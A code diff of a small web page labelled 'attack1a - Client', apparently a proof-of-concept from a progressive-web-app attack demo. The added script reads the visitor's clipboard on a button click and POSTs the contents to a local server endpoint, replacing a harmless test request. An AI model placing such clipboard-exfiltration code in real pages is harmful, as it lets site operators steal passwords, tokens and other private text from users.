@@ -1,4 +1,3 @@
-<!-- attack1a (client) -->
 <!DOCTYPE html>
 <html lang="en">
 
@@ -19,61 +18,31 @@
 <body>
   <div class="container">
     <h1>attack1a - Client</h1>
-    <button id="sendRequest" class="btn btn-primary">Send Request to attack1b</button>
+    <button id="sendClipboard" class="btn btn-primary">Send Clipboard Content</button>
   </div>
 
   <script>
-    document.getElementById('sendRequest').addEventListener('click', function () {
-      fetch('https://pwa-demo.github.io/attack1b/', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ message: 'Hello from attack1a!' })
-      }).then(response => response.text())
-        .then(data => console.log('Request sent:', data))
-        .catch(error => console.error('Error:', error));
-    });
-  </script>
-</body>
+    document.getElementById('sendClipboard').addEventListener('click', async function () {
+      try {
+        // Read the clipboard content
+        const clipboardText = await navigator.clipboard.readText();
 
-</html>
-
-<!-- attack1b (server) -->
-<!DOCTYPE html>
-<html lang="en">
-
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>attack1b Demos</title>
-  <link rel="canonical" href="https://pwa-demo.github.io/attack1b/" />
-  <link rel="manifest" href="/attack1b/manifest.json">
-  <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
-  <style>
-    .container {
-      margin-top: 20px;
-    }
-  </style>
-</head>
-
-<body>
-  <script>
-    document.getElementById('sendRequest').addEventListener('click', function () {
-      fetch('http://localhost:3000/receive-request', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({ message: 'Hello from attack1a!' })
-      })
-        .then(response => response.json())
-        .then(data => {
-          console.log('Received IP from server:', data.ip);
+        // Send clipboard content to the server
+        fetch('http://localhost:3000/receive-request', {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify({ clipboardContent: clipboardText })
         })
-        .catch(error => console.error('Error:', error));
-    });
+          .then(response => response.json())
+          .then(data => console.log('Server response:', data))
+          .catch(error => console.error('Error sending clipboard content:', error));
 
+      } catch (error) {
+        console.error('Failed to read clipboard:', error);
+      }
+    });
   </script>
 </body>
 
